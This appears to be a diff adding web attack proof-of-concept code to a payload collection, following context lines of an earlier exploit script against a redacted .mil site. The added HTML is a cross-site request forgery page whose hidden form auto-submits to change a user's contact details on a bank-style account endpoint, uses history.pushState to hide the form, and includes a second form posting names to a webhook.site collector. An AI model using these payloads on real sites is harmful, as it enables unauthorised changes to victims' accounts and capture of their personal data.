@@ -100,3 +100,61 @@ https://███████.███████.mil/kc/main/pop_up_frm.asp?l
     .catch(err => console.log("Exploit failed", err));
 </script>
 
+
+
+
+<html>
+<body>
+    <!-- Auto-submitting form extracted from screenshots -->
+    <form action="https://my.example.co.uk/PlanReviewAct/PersonalDetailsConfirm.asp" method="POST">
+        <input type="hidden" name="Occupation" value="scriptone" />
+        <input type="hidden" name="HomeTelCode" value="D" />
+        <input type="hidden" name="HomeTelNumber" value="1001" />
+        <input type="hidden" name="WorkTelCode" value="1234" />
+        <input type="hidden" name="WorkTelNumber" value="1234" />
+        <input type="hidden" name="WorkTelExtn" value="1001" />
+        <input type="hidden" name="MobileTelNumber" value="HEX0D66C9327BD608FBD6" />
+        <input type="hidden" name="EmailAddress" value="HEX1234567890ABCD" />
+        <input type="hidden" name="PreferredContactMethod" value="telephone" />
+        <input type="hidden" name="PreferredContactTime" value="number" />
+        <input type="hidden" name="PreferredContactTimeDayTime" value="HEX4291058A52A3" />
+        <input type="hidden" name="CustomerID" value="HEXBA8F32A4" />
+        <input type="hidden" name="PlanID" value="HEX3E8B0283AA3" />
+        <input type="hidden" name="hdnSelectedAccountId" value="HEX" />
+        <input type="hidden" name="hdnSelectedNickname" value="HEX" />
+        <input type="hidden" name="hdnSelectedMortage" value="HEX" />
+        <input type="hidden" name="hdnSelectedLoans" value="HEX" />
+        <input type="hidden" name="hdnSelectedCreditCard" value="HEX" />
+        <input type="hidden" name="hdnShowMeSavings" value="HEX" />
+        <input type="hidden" name="hdnShowMeMortage" value="HEX" />
+        <input type="hidden" name="hdnShowMeLoans" value="HEX" />
+        <input type="hidden" name="hdnShowMeCreditCard" value="HEX" />
+        <input type="submit" value="Submit request" />
+    </form>
+
+    <!-- JavaScript Auto-Submit -->
+    <script>
+        history.pushState('', '', '/'); // Prevents back button revealing the form
+        document.forms[0].submit(); // Auto-submits the form
+    </script>
+
+    <!-- Embedded Form Posting to Webhook -->
+    <form method="post" action="https://webhook.site/57eb2c23-a022-417e-9cae-a4deb04a5d2c">
+        <div class="rendered-form formbuilder-embedded-bootstrap">
+            <div class="formbuilder-text form-group field-first-name">
+                <label for="first-name" class="formbuilder-text-label">First Name<span class="formbuilder-required">*</span></label>
+                <input type="text" class="form-control" name="first-name" id="first-name" required="required" aria-required="true">
+            </div>
+            <div class="formbuilder-text form-group field-last-name">
+                <label for="last-name" class="formbuilder-text-label">Last Name<span class="formbuilder-required">*</span></label>
+                <input type="text" class="form-control" name="last-name" id="last-name" required="required" aria-required="true">
+            </div>
+            <div class="formbuilder-button form-group field-submit">
+                <button type="submit" class="form-control btn-primary btn" name="submit" style="primary" id="submit">Submit</button>
+            </div>
+        </div>
+    </form>
+
+</body>
+</html>
+
